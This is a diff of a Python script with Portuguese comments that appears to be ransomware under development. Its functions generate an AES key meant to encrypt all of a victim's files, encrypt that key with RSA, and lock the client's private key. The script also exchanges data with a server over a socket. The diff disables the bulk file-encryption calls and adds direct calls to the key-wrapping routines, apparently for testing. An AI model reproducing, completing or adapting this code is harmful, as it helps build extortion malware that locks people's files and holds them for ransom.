@@ -8,6 +8,7 @@ import socket
 from random import choice
 import multiprocessing
 import getpass
+import sys
 
 from AES import *
 from RSA import *
@@ -81,19 +82,15 @@ def listar(diretorio, tipos_arq, modo):
 
 
 def client(IP_serv):
-
-    porta=6064
-    try:
-        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        socket_obj.connect((IP_serv, porta))
-    except socket.error as erro:
-        print('Erro ocorrido: '+str(erro))
-        return
-    # conectado ao servidor
-    print('enviando ID')
-    mensagem='TESTE_ID'
-    socket_obj.send(mensagem)
-    #data = socket_obj.recv(1024) # recebeu do servidor a chave publica
+    s = socket.socket()
+    s.connect(("localhost",9999))
+    l = s.recv(1024)
+    f = open ("teste.txt", "wb")
+    while (l):
+        f.write(l)
+        l = s.recv(1024)
+    f.close()
+    s.close()
 
 def gera_chave_AES():
     # GERA SENHA AES que vai criptografar os arquivos
@@ -118,7 +115,7 @@ def gera_chave_AES():
 def crypto_all():
     AES_key=gera_chave_AES()
     print('[*] chave AES gerada')
-    menu(1) # -> criptografa tudo
+    #menu(1) # -> criptografa tudo
 
     AES_to_RSA()
     print('[*] senha AES criptografado com chave RSA')
@@ -127,16 +124,16 @@ def crypto_all():
     RSA_to_SRSA()
     print('[*] chave privada do cliente criptografada')
 
-    print('tudo certo')
 
 def decrypt_all():
     SRSA_to_RSA()
     print('[*] chave privada do cliente descriptografada')
     RSA_to_AES()
     print('[*] chave AES descriptografada')
-    menu(2)
+    #menu(2)
 
-
+crypto_all()
+decrypt_all()
 
 # == ALGORITMO ==
     # criptografa todos os arquivos com AES
